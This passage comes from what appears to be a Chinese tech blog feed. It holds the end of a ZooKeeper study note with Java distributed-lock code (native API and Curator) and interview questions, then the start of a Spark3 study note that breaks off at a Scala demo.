class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributedLock</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String connectString = <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ZooKeeper zk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> CountDownLatch connectLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">private</span> CountDownLatch waitLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String waitPath;</span><br><span class="line">    <span class="keyword">private</span> String currentMode;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DistributedLock</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, KeeperException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取连接</span></span><br><span class="line">        zk = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span> Watcher() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// connectLatch  如果连接上zk  可以释放</span></span><br><span class="line">                <span class="keyword">if</span> (watchedEvent.getState() == Event.KeeperState.SyncConnected)&#123;</span><br><span class="line">                    connectLatch.countDown();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// waitLatch  需要释放</span></span><br><span class="line">                <span class="keyword">if</span> (watchedEvent.getType()== Event.EventType.NodeDeleted &amp;&amp; watchedEvent.getPath().equals(waitPath))&#123;</span><br><span class="line">                    waitLatch.countDown();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待zk正常连接后，往下走程序</span></span><br><span class="line">        connectLatch.await();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断根节点/locks是否存在</span></span><br><span class="line">        Stat stat = zk.exists(<span class="string">"/locks"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stat == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 创建一下根节点</span></span><br><span class="line">            zk.create(<span class="string">"/locks"</span>, <span class="string">"locks"</span>.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对zk加锁</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zklock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建对应的临时带序号节点</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            currentMode = zk.create(<span class="string">"/locks/"</span> + <span class="string">"seq-"</span>, <span class="keyword">null</span>, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// wait一小会, 让结果更清晰一些</span></span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断创建的节点是否是最小的序号节点，如果是获取到锁；如果不是，监听他序号前一个节点</span></span><br><span class="line"></span><br><span class="line">            List&lt;String&gt; children = zk.getChildren(<span class="string">"/locks"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果children 只有一个值，那就直接获取锁； 如果有多个节点，需要判断，谁最小</span></span><br><span class="line">            <span class="keyword">if</span> (children.size() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Collections.sort(children);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 获取节点名称 seq-00000000</span></span><br><span class="line">                String thisNode = currentMode.substring(<span class="string">"/locks/"</span>.length());</span><br><span class="line">                <span class="comment">// 通过seq-00000000获取该节点在children集合的位置</span></span><br><span class="line">                <span class="keyword">int</span> index = children.indexOf(thisNode);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断</span></span><br><span class="line">                <span class="keyword">if</span> (index == -<span class="number">1</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"数据异常"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 就一个节点，可以获取锁了</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 需要监听  他前一个节点变化</span></span><br><span class="line">                    waitPath = <span class="string">"/locks/"</span> + children.get(index - <span class="number">1</span>);</span><br><span class="line">                    zk.getData(waitPath,<span class="keyword">true</span>,<span class="keyword">new</span> Stat());</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 等待监听</span></span><br><span class="line">                    waitLatch.await();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解锁</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unZkLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除节点</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            zk.delete(<span class="keyword">this</span>.currentMode,-<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributedLockTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException, IOException, KeeperException </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">final</span>  DistributedLock lock1 = <span class="keyword">new</span> DistributedLock();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span>  DistributedLock lock2 = <span class="keyword">new</span> DistributedLock();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   lock1.zklock();</span><br><span class="line">                   System.out.println(<span class="string">"线程1 启动，获取到锁"</span>);</span><br><span class="line">                   Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                   lock1.unZkLock();</span><br><span class="line">                   System.out.println(<span class="string">"线程1 释放锁"</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock2.zklock();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 启动，获取到锁"</span>);</span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                    lock2.unZkLock();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 释放锁"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-Curator-框架实现分布式锁案例">2.3 Curator 框架实现分布式锁案例</h3><blockquote><p><a href="https://curator.apache.org/index.html" target="_blank" rel="noopener" title="https://curator.apache.org/index.html">https://curator.apache.org/index.html</a></p></blockquote><p>原生的 Java API 开发存在的问题会话，连接是异步的，需要自己去处理。比如使用 CountDownLatch；Watch 需要重复注册，不然就不能生效；开发的复杂性还是比较高的；不支持多节点删除和创建。需要自己去递归</p><p>Curator 是一个专门解决分布式锁的框架，解决了原生 JavaAPI 开发分布式遇到的问题，首先添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-framework<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-recipes<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.curator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>curator-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CuratorLockTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建分布式锁1</span></span><br><span class="line">        InterProcessMutex lock1 = <span class="keyword">new</span> InterProcessMutex(getCuratorFramework(), <span class="string">"/locks"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建分布式锁2</span></span><br><span class="line">        InterProcessMutex lock2 = <span class="keyword">new</span> InterProcessMutex(getCuratorFramework(), <span class="string">"/locks"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock1.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程1 获取到锁"</span>);</span><br><span class="line"></span><br><span class="line">                    lock1.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程1 再次获取到锁"</span>);</span><br><span class="line"></span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                    lock1.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程1 释放锁"</span>);</span><br><span class="line"></span><br><span class="line">                    lock1.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程1  再次释放锁"</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock2.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 获取到锁"</span>);</span><br><span class="line"></span><br><span class="line">                    lock2.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 再次获取到锁"</span>);</span><br><span class="line"></span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                    lock2.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程2 释放锁"</span>);</span><br><span class="line"></span><br><span class="line">                    lock2.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程2  再次释放锁"</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> CuratorFramework <span class="title">getCuratorFramework</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ExponentialBackoffRetry policy = <span class="keyword">new</span> ExponentialBackoffRetry(<span class="number">3000</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        CuratorFramework client = CuratorFrameworkFactory.builder().connectString(<span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>)</span><br><span class="line">                .connectionTimeoutMs(<span class="number">2000</span>)</span><br><span class="line">                .sessionTimeoutMs(<span class="number">2000</span>)</span><br><span class="line">                .retryPolicy(policy).build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动客户端</span></span><br><span class="line">        client.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"zookeeper 启动成功"</span>);</span><br><span class="line">        <span class="keyword">return</span> client;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>五、总结</h1><h2 id="1、UI界面安装">1、UI界面安装</h2><blockquote><p>参考：<a href="https://blog.csdn.net/lemon_TT/article/details/113263705" target="_blank" rel="noopener" title="Centos7安装zookeeper和Web UI">Centos7安装zookeeper和Web UI</a></p></blockquote><h2 id="2、企业面试真题（面试重点）">2、企业面试真题（面试重点）</h2><h3 id="2-1-选举机制">2.1 选举机制</h3><p><strong>半数机制，超过半数的投票通过，即通过</strong></p><p>第一次启动选举规则：</p><ul><li>投票过半数时，服务器 id 大的胜出</li></ul><p>第二次启动选举规则：</p><ul><li>EPOCH 大的直接胜出</li><li>EPOCH 相同，事务 id 大的胜出</li><li>事务 id 相同，服务器 id 大的胜出</li></ul><h3 id="2-2-生产集群安装多少-zk-合适？">2.2 生产集群安装多少 zk 合适？</h3><p><strong>安装奇数台</strong>。服务器台数多：好处，提高可靠性；坏处：提高通信延时。生产经验：</p><ul><li>10 台服务器：3 台 zk；</li><li>20 台服务器：5 台 zk；</li><li>100 台服务器：11 台 zk；</li><li>200 台服务器：11 台 zk</li></ul><h3 id="2-3-常用命令">2.3 常用命令</h3><p>ls、get、create、delete</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Zookeeper3.5.7基础学习&lt;/h1&gt;
&lt;h1&gt;一、Zookeeper入门&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;官网：&lt;a href=&quot;https://zookeeper.apache.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://zookeeper.apache.org/&quot;&gt;https://zookeeper.apache.org/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1、概述&quot;&gt;1、概述&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Zookeeper 是一个开源的分布式的，为分布式框架提供协调服务的 Apache 项目&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Zookeeper从设计模式角度来理解：是一个基于观察者模式设计的分布式服务管理框架，它&lt;strong&gt;负责存储和管理大家都关心的数据&lt;/strong&gt;，然后接受观察者的注册，一旦这些数据的状态发生变化，Zookeeper就将负责通知已经在Zookeeper上注册的那些观察者做出相应的反应**。Zookeeper=文件系统+通知机制**&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Spark3学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/4a5309a3.html"/>
    <id>https://blog.shawncoding.top/posts/4a5309a3.html</id>
    <published>2024-02-06T07:04:33.000Z</published>
    <updated>2024-02-29T12:03:29.810Z</updated>
    
    <content type="html"><![CDATA[<h1>Spark3学习笔记</h1><h1>一、Spark 基础</h1><h2 id="1、Spark概述">1、Spark概述</h2><h3 id="1-1-Spark简介">1.1 Spark简介</h3><p>Spark 是一种基于内存的快速、通用、可扩展的大数据分析计算引擎。在 FullStack 理想的指引下，<strong>Spark 中的 Spark SQL 、SparkStreaming 、MLLib 、GraphX 、R 五大子框架和库之间可以无缝地共享数据和操作</strong>， 这不仅打造了 Spark 在当今大数据计算领域其他计算框架都无可匹敌的优势， 而且使得 Spark 正在加速成为大数据处理中心首选通用计算平台。</p><a id="more"></a><ul><li><strong>Spark Core</strong>：实现了 Spark 的基本功能，包含 RDD、任务调度、内存管理、错误恢复、与存储系统交互等模块</li><li><strong>Spark SQL</strong>：Spark 用来操作结构化数据的程序包。通过 Spark SQL，我们可以使用 SQL 操作数据</li><li><strong>Spark Streaming</strong>：Spark 提供的对实时数据进行流式计算的组件。提供了用来操作数据流的 API</li><li><strong>Spark MLlib</strong>：提供常见的机器学习(ML)功能的程序库。包括分类、回归、聚类、协同过滤等，还提供了模型评估、数据导入等额外的支持功能</li><li><strong>GraphX(图计算)</strong>：Spark 中用于图计算的 API，性能良好，拥有丰富的功能和运算符，能在海量数据上自如地运行复杂的图算法</li><li><strong>集群管理器</strong>：Spark 设计为可以高效地在一个计算节点到数千个计算节点之间伸缩计算</li><li><strong>Structured Streaming</strong>：处理结构化流,统一了离线和实时的 API</li></ul><h3 id="1-2-Spark-VS-Hadoop">1.2 Spark VS Hadoop</h3><table><thead><tr><th></th><th><strong>Hadoop</strong></th><th><strong>Spark</strong></th></tr></thead><tbody><tr><td><strong>类型</strong></td><td>分布式基础平台, 包含计算, 存储, 调度</td><td>分布式计算工具</td></tr><tr><td><strong>场景</strong></td><td>大规模数据集上的批处理</td><td>迭代计算, 交互式计算, 流计算</td></tr><tr><td><strong>价格</strong></td><td>对机器要求低, 便宜</td><td>对内存有要求, 相对较贵</td></tr><tr><td><strong>编程范式</strong></td><td>Map+Reduce, API 较为底层, 算法适应性差</td><td>RDD 组成 DAG 有向无环图, API 较为顶层, 方便使用</td></tr><tr><td><strong>数据存储结构</strong></td><td>MapReduce 中间计算结果存在 HDFS 磁盘上, 延迟大</td><td>RDD 中间运算结果存在内存中 , 延迟小</td></tr><tr><td><strong>运行方式</strong></td><td>Task 以进程方式维护, 任务启动慢</td><td>Task 以线程方式维护, 任务启动快</td></tr></tbody></table><p>💖 注意：尽管 Spark 相对于 Hadoop 而言具有较大优势，但 Spark 并不能完全替代 Hadoop，Spark 主要用于替代 Hadoop 中的 MapReduce 计算模型。存储依然可以使用 HDFS，但是中间结果可以存放在内存中；调度可以使用 Spark 内置的，也可以使用更成熟的调度系统 YARN 等。  实际上，Spark 已经很好地融入了 Hadoop 生态圈，并成为其中的重要一员，它可以借助于 YARN 实现资源调度管理，借助于 HDFS 实现分布式存储。  此外，Hadoop 可以使用廉价的、异构的机器来做分布式存储与计算，但是，Spark 对硬件的要求稍高一些，对内存与 CPU 有一定的要求。</p><h3 id="1-3-Spark特点">1.3 Spark特点</h3><ul><li>快。与 Hadoop 的 MapReduce 相比，<strong>Spark 基于内存的运算要快 100 倍以上，基于硬盘的运算也要快 10 倍以上</strong>。Spark 实现了高效的 DAG 执行引擎，可以通过基于内存来高效处理数据流。</li><li>易用。<strong>Spark 支持 Java、Python、R 和 Scala 的 API，还支持超过 80 种高级算法，使用户可以快速构建不同的应用</strong>。而且 Spark 支持交互式的 Python 和 Scala 的 shell，可以非常方便地在这些 shell 中使用 Spark 集群来验证解决问题的方法。</li><li>通用。Spark 提供了统一的解决方案。<strong>Spark 可以用于批处理、交互式查询(Spark SQL)、实时流处理(Spark Streaming)、机器学习(Spark MLlib)和图计算(GraphX)</strong>。这些不同类型的处理都可以在同一个应用中无缝使用。Spark 统一的解决方案非常具有吸引力，毕竟任何公司都想用统一的平台去处理遇到的问题，减少开发和维护的人力成本和部署平台的物力成本。</li><li>兼容性。<strong>Spark 可以非常方便地与其他的开源产品进行融合</strong>。比如，Spark 可以使用 Hadoop 的 YARN 和 Apache Mesos 作为它的资源管理和调度器，并且可以处理所有 Hadoop 支持的数据，包括 HDFS、HBase 和 Cassandra 等。这对于已经部署 Hadoop 集群的用户特别重要，因为不需要做任何数据迁移就可以使用 Spark 的强大处理能力。Spark 也可以不依赖于第三方的资源管理和调度器，它实现了 Standalone 作为其内置的资源管理和调度框架，这样进一步降低了 Spark 的使用门槛，使得所有人都可以非常容易地部署和使用 Spark。此外，Spark 还提供了在 EC2 上部署 Standalone 的 Spark 集群的工具。</li></ul><h3 id="1-4-Spark入门Demo">1.4 Spark入门Demo</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 